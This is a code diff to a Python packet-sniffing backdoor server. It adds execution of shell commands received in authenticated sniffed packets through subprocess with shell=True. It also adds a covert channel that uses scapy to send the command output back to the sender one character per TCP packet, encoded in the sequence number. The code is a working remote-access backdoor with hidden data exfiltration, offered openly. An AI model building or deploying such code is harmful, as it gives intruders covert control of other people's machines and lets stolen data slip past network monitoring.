@@ -1,6 +1,9 @@
 import socket
+from subprocess import Popen, PIPE
+from scapy.all import *
 from struct import *
 import sys
+import os
 import threading
 import pcapy
 import config
@@ -24,50 +27,9 @@ def startServer():
 
 def packetHandler(packet):
 	if (authenticated(packet)):
-		pacType = checkType(packet)
-		ip, protoH, data = stripPacket(packet, pacType)
+		pacType = utils.checkType(packet)
+		ip, protoH, data = utils.stripPacket(packet, pacType)
 		checkCommand(ip, protoH, data, pacType)
-
-def stripPacket(packet, proto):
-	ipLength = 20
-	udpLength = 8
-	icmpLength = 4
-	ethLength = 14
-	
-	ip = packet[ethLength:ipLength+ethLength]  # start from after ethernet, go 20 characters
-	ipHeader = unpack('!BBHHHBBH4s4s', ip)
-
-	if proto == 'tcp':
-		tcp  = packet[ipLength+ethLength:ipLength+ethLength+20] # start from after tcp, go 20 characters
-		tcpHeader = unpack('!HHLLBBHHH', tcp)
-		temp = tcpHeader[4]
-		tcpLength = temp >> 4		
-		data = packet[ipLength+ethLength+tcpLength*4:]
-		return ipHeader, tcpHeader, data
-	elif proto == 'udp':
-		udp = packet[ipLength+ethLength:ipLength+ethLength+udpLength]
-		udpHeader = unpack('!HHHH', udp)
-		data = packet[ipLength+ethLength+udpLength:]
-		return ipHeader, udpHeader, data
-	elif proto == 'icmp':
-		icmp = packet[ipLength+ethLength:ipLength+ethLength+icmpLength]
-		icmpHeader = unpack('!BBH', icmp)
-		data = packet[ipLength+ethLength+icmpLength:]
-		return ipHeader, icmpHeader, data
-
-def checkType(packet):
-	ethLength = 14
-	ipLength = 20
-	ip = packet[ethLength:ipLength+ethLength]
-	ipHeader = unpack('!BBHHHBBH4s4s', ip)
-	protocol = ipHeader[6]
-    
-	if protocol == 6:
-		return 'tcp'
-	elif protocol == 1:
-		return 'icmp'
-	elif protocol == 17:
-		return 'udp'
 
 def authenticated(packet):	
 	ethLength = 14
@@ -105,7 +67,26 @@ def executeCommand(srcAddress):
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
-	print command + " from "
-	print str(srcAddress)
+	print command + " from " + srcAddress
 	
+	# directory = os.system("pwd")
+	# results = os.system(command)
+	# shell = str(directory) + " > " + str(results)
+	# print shell -> send results back to client
+	directory = subprocess.Popen("pwd", shell=True, stdout=PIPE).stdout.read() 
+	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
+	shell = "["+directory[:-1] + "]# " + results
+
+	print shell
+
+	sendThread = threading.Thread(target=sendResults, args=(str(shell),srcAddress))
+	sendThread.daemon = True
+	sendThread.start()
+
 	command = ""
+
+def sendResults(results, address):
+	# encrypt results 
+	# for each character, send a packet to address
+	for c in results:
+		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)), verbose=0)
